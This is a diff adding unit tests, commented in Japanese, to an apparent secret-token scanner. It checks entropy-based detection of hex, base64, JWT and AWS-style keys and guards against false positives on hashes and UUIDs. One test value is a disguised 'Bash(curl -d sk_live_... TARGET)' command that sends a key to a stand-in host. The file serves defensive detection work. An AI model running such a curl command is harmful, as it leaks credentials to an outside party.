@@ -55,6 +55,45 @@ check("layer4_long_random", core.scan_object({"note": "xJ3kP9mQ2nR8vT1wY5aZ4bC6"
 check("layer4_disguise_bash_inner_token", core.scan_value_for_token("cmd", "Bash(curl -d sk_live_4eC39HqLyjWDarjtT1zdp7dc1yX8u5abcdef TARGET)"), True)  # 限界1是正: Bash(偽装)のinner引数を分割再走査で捕捉
 check("layer4_legit_long_bash_safe", core.scan_value_for_token("cmd", "Bash(npm install -g typescript-node-esbuild-loader-long-command-name-safe)"), False)  # 正規長Bashは各引数が32字未満/文字種不足で誤検知せず
 
+# === 層2.5: Shannon entropy（hex/base64-only TOKEN 補捉・案Aキー名AND）===
+hex40 = "a1b2c3d4e5f6789012345678901234567890abcd"           # hex-only・entropy≈3.93
+real_b64 = "NYoj/SJG0sZmw/7pO5U5eQHt/ViZ58FOG3w0guFu3N0="   # base64・entropy≈4.77
+jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
+aws_secret = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"      # AWS secret access key(40字)
+
+# 捕捉すべき(True)
+check("layer1_jwt", core.layer1_prefix(jwt_token), True)                                                       # 層1 ^eyJ 拡張
+check("scan_jwt", core.scan_value_for_token("token", jwt_token), True)
+check("layer25_hex_direct", core.layer25_entropy("api_token", hex40), True)                                     # 層2(文字種2種)をすり抜けるhexをentropyで
+check("layer25_b64_direct", core.layer25_entropy("webhook_secret", real_b64), True)
+check("scan_hex_under_secret", core.scan_value_for_token("api_token", hex40), True)
+check("scan_b64_under_secret", core.scan_value_for_token("secret", real_b64), True)
+check("scan_aws_secret", core.scan_value_for_token("credentials", aws_secret), True)                           # AWS secret(文字種4種)は層2で捕捉
+check("scan_nested_hex", core.scan_object({"config": {"api_token": hex40}}), True)
+
+# 誤報回避(False)・非secretキー名下のhex(hash系)は scan で捕捉しない
+git_sha = "78b70ff5a3c2e1d4b6f8a9c0d1e2f3a4b5c6d7e8"      # hex・entropy≈3.94（hex TOKENと不可分離）
+md5_h = "d41d8cd98f00b204e9800998ecf8427e"                 # 32字 hex
+sha256_h = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"  # 64字 hex
+uuid_h = "550e8400e29b41d4a716446655440000"               # 32字 hex
+check("fp_gitsha_comment", core.scan_value_for_token("comment", git_sha), False)
+check("fp_gitsha_id", core.scan_value_for_token("id", git_sha), False)
+check("fp_md5_checksum", core.scan_value_for_token("checksum", md5_h), False)
+check("fp_sha256_version", core.scan_value_for_token("version_hash", sha256_h), False)
+check("fp_uuid_id", core.scan_value_for_token("_id", uuid_h), False)
+
+# 誤報回避(False)・layer25直接（低entropy/短い/${ENV}/英語文章）
+english = "This is a normal description of the settings file configuration values"
+check("fp_short_hex", core.layer25_entropy("token", "deadbeef"), False)                                         # len<32
+check("fp_degenerate", core.layer25_entropy("token", "a"*40), False)                                            # entropy=0
+check("fp_env_ref", core.layer25_entropy("api_key", "${MY_API_KEY}"), False)                                    # ${ENV}許可
+check("fp_english_secret", core.layer25_entropy("secret", english), False)                                      # hex/base64非該当
+
+# 閾値検証（hex TOKEN と git SHA の不可分離性を実証）
+check("hex_entropy_in_range", 3.0 <= core._shannon_entropy(hex40) <= 4.0, True)
+check("gitsha_entropy_same_range", 3.0 <= core._shannon_entropy(git_sha) <= 4.0, True)
+check("english_below_b64_threshold", core._shannon_entropy(english) < 4.5, True)
+
 # === 監視対象パス抽出 ===
 settings_sample = {
     "permissions": {"allow": ["Bash(npm:*)", "sk-EVIL" + "x"*40], "deny": ["rm"], "ask": [], "default": "ask"},
